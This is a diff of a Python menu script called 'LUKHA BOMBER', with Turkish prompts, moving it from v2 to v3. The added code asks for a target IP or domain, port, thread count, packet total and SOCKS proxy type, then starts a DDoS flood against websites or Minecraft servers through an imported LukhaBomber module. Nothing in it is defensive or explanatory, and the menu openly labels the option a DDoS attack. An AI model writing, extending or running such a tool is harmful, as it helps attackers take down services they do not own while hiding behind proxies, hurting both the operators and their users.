@@ -1,33 +1,57 @@
 import os
 import sys
 import time
+import lukha  
 
 def install_requirements():
-    print("\n[+] Gereken paketler yükleniyor...\n")
+    print("\nGereksinimler yükleniyor...")
     os.system("pip install pysocks")
-    print("\n[✓] Kurulum tamamlandı!")
-    input("\nDevam etmek için Enter'a bas...")
-    main_menu()
+    print("Tamamlandı!")
+    input("Devam etmek için Enter'a bas...")
 
-def start_ddos():
-    os.system("python lukha_bomber_proxy.py")
+def start_attack():
+    target = input("Hedef IP/Domain: ").strip()
+    port = int(input("Port (Site için 80, Minecraft için 25565 önerilir): ") or "80")
+    threads = int(input("Thread sayısı (default 200): ") or "200")
+    total_requests = int(input("Gönderilecek toplam paket sayısı: "))
+    proxy_type = input("Proxy türü (socks4/socks5): ").strip().lower()
+    if proxy_type not in ["socks4", "socks5"]:
+        print("Geçersiz proxy tipi!")
+        return
+    print("Hedef türü seç:")
+    print("1. Site (HTTP + TCP Flood)")
+    print("2. Minecraft Sunucusu (Özel Flood)")
+    choice = input("Seçiminiz (1 veya 2): ")
+    if choice == "1":
+        attack_target = "site"
+    elif choice == "2":
+        attack_target = "minecraft"
+        if port == 80:
+            port = 25565  
+    else:
+        print("Geçersiz seçim!")
+        return
+
+    bomber = lukha.LukhaBomber(target, port, threads, total_requests, proxy_type, attack_target)
+    bomber.start()
 
 def main_menu():
     while True:
-        os.system('clear' if os.name != 'nt' else 'cls')
+        os.system('cls' if os.name == 'nt' else 'clear')
         print("""
 ╔════════════════════════════╗
-║         LUKHA BOMBER v2         ║
+║         LUKHA BOMBER v3         ║
 ╠════════════════════════════╣
 ║ 1. DDoS Saldırısı Başlat        ║
 ║ 2. Gereksinimleri Yükle         ║
 ║ 3. Çıkış                        ║
 ╚════════════════════════════╝
-        """)
+""")
         choice = input("Seçiminiz (1-3): ")
 
         if choice == "1":
-            start_ddos()
+            start_attack()
+            input("Ana menüye dönmek için Enter'a bas...")
         elif choice == "2":
             install_requirements()
         elif choice == "3":
